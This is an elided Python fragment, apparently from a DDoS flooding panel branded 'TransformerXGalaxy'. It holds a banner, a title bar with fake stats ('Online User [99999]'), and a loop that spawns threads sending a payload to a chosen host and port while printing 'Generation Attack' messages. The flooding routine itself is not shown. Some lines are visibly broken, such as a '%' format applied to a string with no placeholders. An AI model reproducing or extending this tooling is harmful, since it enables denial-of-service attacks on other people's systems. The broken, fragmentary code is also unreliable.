...
\033[0;36m                 ║           \033[0;37mUSERNAME = TransformerXGalaxy                
...
def main():
	...
	while True:
		...
		sys.stdout.write("\x1b]2;[-] TransformerXGalaxy | Api Connected [99999] | Backup Server [99999] | Online User [99999] | Admin: [TransformerXGalaxy] | POWER : {}% [UNSTABLE]\x07".format (powerran))
		...
		if sinput == "cls":
			...
			try:
				if running >= 20000:
					...
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[91m[-] TransformerXGalaxy Generation Attack"%(host,port))
					time.sleep(1)
					os.system('cls')
					print("\033[91m[\] TransformerXGalaxy Generation Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[91m[|] TransformerXGalaxy Generation Attack...")
					time.sleep(1)
